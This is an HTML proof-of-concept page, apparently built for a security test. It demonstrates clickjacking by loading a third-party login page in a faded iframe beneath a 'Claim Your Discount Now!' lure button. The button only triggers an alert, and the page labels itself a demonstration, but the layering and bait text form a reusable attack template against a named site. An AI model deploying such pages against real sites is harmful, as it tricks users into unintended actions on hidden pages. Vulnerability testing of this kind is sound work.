<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }
        .container {
            position: relative;
            width: 100%;
            height: 600px;
            border: 2px solid red;
        }
        iframe {
            position: absolute;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0.7; /* For demonstration only */
            z-index: 1;
        }
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            background: rgba(0,0,0,0.0001);
        }
        .clickbait {
            position: absolute;
            top: 70%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 15px 30px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            z-index: 3;
        }
    </style>
</head>
<body>
    <h1>Special Offer Page</h1>
    <p>Click the button below to claim your exclusive discount!</p>
    
    <div class="container">
        <iframe src="https://share.telenorinpli.se/web/client/login"></iframe>
        <div class="overlay"></div>
        <button class="clickbait" onclick="alert('Action performed on hidden page!')">
            Claim Your Discount Now!
        </button>
    </div>
    
    <p>Note: This demonstrates a clickjacking vulnerability. The login form is loaded behind the green button.</p>
</body>
</html>
